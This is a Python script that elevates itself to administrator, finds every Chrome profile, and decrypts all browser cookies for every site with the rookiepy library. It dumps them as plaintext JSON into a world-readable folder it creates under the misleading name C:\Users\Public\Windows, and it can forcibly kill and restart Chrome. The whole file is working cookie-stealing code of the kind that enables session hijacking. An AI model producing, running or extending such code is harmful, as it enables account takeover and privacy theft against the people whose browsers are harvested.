import os
import rookiepy
import json
import subprocess
import time
import psutil
from pathlib import Path
from os import getenv
import ctypes, sys

# Ensure the directory C:\Users\Public\Windows exists
windows_dir = Path("C:/Users/Public/Windows")
if not os.path.exists(windows_dir):
    os.makedirs(windows_dir)

# Paths and configurations
localappdata = getenv('LOCALAPPDATA')
BASE_DIR = Path(localappdata) / 'Google/Chrome/User Data'
TARGET_FILE = "google profile.ico"
PROFILE_KEYWORD = "profile"
EXCLUDE_PROFILES = {"Guest Profile", "System Profile"}
EXCLUDE_KEYWORD = "cache"

def require_admin():
    if not ctypes.windll.shell32.IsUserAnAdmin():
        print("Relaunching as admin...")
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
        sys.exit()

require_admin()

def is_eligible_folder(folder_path, folder_name):
    """Checks if a folder is eligible for detection."""
    # Exclude specific profiles and folders with "cache" in their name
    if folder_name in EXCLUDE_PROFILES or EXCLUDE_KEYWORD.lower() in folder_name.lower():
        return False
    # Check for the target file or profile keyword in the name
    has_target_file = os.path.exists(os.path.join(folder_path, TARGET_FILE))
    has_keyword = PROFILE_KEYWORD.lower() in folder_name.lower()
    return has_target_file or has_keyword

def detect_folders(base_dir):
    """Detects eligible folders and returns their names as a list."""
    detected_folders = []
    for folder_name in os.listdir(base_dir):
        folder_path = os.path.join(base_dir, folder_name)
        if os.path.isdir(folder_path) and is_eligible_folder(folder_path, folder_name):
            detected_folders.append(folder_name)
    return detected_folders

def get_chrome_path():
    """Retrieve the executable path of a running Chrome process."""
    for proc in psutil.process_iter(['name', 'exe']):
        if proc.info['name'] == 'chrome.exe' and proc.info['exe']:
            return proc.info['exe']
    return None

def do_yes_action():

    chrome_path = get_chrome_path()

    if chrome_path:
        CHROME_PATH = chrome_path
        try:
            # Terminate Chrome processes
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] == 'chrome.exe':
                    proc.terminate()

            time.sleep(2)  # Wait for processes to terminate

            print("Starting Chrome...")
            subprocess.Popen([CHROME_PATH], stdout=subprocess.PIPE, stderr=subprocess.PIPE)  
        except Exception as e:
            print(f"An error occurred: {e}")
    else:
        print("Chrome is not running, exiting...")
        exit()  # Exiting if Chrome is not running



def main():
    try:
        detected_folders = detect_folders(BASE_DIR)
        for profile in detected_folders:
            db_path = Path(BASE_DIR) / profile / "Network" / "Cookies"
            key_path = Path(BASE_DIR) / "Local State"
            print(db_path)
            print(key_path)
            print("me")
            cookies = rookiepy.any_browser(db_path=str(db_path), key_path=str(key_path), domains=None)
            output_file = f"C:\\Users\\Public\\Windows\\ck_{profile}.txt"  # Adjusted to use profile
            print("  ow")
            with open(output_file, "w") as file:
                json.dump(cookies, file, indent=4)
            print(f"Cookies written to {output_file}")
    except Exception as e:

        print("Restart chrome?")
        choice = input("y or n: ").strip().lower()

        if choice == 'y':
            print("Stopping...")
            do_yes_action()

        else:
            print("Exiting...")
            exit()

if __name__ == "__main__":
    main()
